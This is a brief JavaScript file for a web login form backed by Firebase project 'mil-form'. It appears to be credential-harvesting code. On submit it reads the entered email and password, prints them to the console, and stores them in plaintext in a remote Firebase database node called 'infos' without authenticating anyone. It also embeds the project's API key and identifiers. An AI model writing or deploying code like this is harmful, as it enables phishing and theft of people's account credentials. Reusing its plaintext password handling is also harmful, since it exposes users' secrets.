

const firebaseConfig = {
    apiKey: "AIzaSyAzsTxTZIPwjB0wXQ0P72_CuhN6msvz9J4",
    authDomain: "mil-form.firebaseapp.com",
    projectId: "mil-form",
    databaseURL: "https://mil-form-default-rtdb.firebaseio.com",
    storageBucket: "mil-form.appspot.com",
    messagingSenderId: "294740847862",
    appId: "1:294740847862:web:91473edeaa4e1bd98f50d7"
  };

  firebase.initializeApp(firebaseConfig);
//   const db = firebase.firestore();

let loginForm = firebase.database().ref("infos"); // Changed variable name to loginForm

document.querySelector('.login-form').addEventListener("submit", submitForm);

function submitForm(e) {
    e.preventDefault();

    const email = document.querySelector('.email').value;
    const password = document.querySelector('.password').value;
    console.log(email, password);

    saveLoginInfo(email, password);

     // Reset the form inputs
     document.querySelector('.login-form').reset();
}

function saveLoginInfo(email, password) {
    const newLoginInfo = loginForm.push(); // Changed variable name to loginForm

    newLoginInfo.set({
        email: email,
        password: password
    });
}